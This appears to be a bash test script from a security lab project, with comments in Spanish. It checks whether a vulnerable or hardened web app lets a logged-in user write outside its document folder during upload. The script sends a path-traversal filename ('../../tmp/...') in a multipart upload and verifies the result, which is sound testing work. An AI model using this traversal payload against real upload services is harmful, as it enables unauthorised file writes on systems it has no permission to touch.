#!/usr/bin/env bash
# OWASP A04/A05 - path traversal en la carga de documentos
source "$(dirname "$0")/lib.sh" "$@"

svc=app-vuln
[ "$mode" = "hardened" ] && svc=app-hard
proof=/tmp/tcc-traversal-proof.txt

compose exec -T "$svc" sh -c "rm -f $proof" >/dev/null 2>&1

tmp="$EVIDENCE_DIR/07-payload.txt"
printf 'prueba de escritura fuera del directorio de documentos\n' > "$tmp"
jar="$(login bob bob123)"

code=$(curl_ -b "$jar" -o /dev/null -w '%{http_code}' -X POST "$target/docs" \
    -F "title=Prueba de traversal" \
    -F "file=@$tmp;type=text/plain;filename=../../tmp/tcc-traversal-proof.txt")
say "POST /docs con filename=../../tmp/tcc-traversal-proof.txt -> HTTP $code"

if compose exec -T "$svc" sh -c "test -f $proof" >/dev/null 2>&1; then
    say "ATAQUE EXITOSO: el archivo se escribio fuera de /data/docs ($proof)"
    exit 0
fi
say "BLOQUEADO: el nombre se descarta y el archivo se guarda con nombre opaco"
exit 1
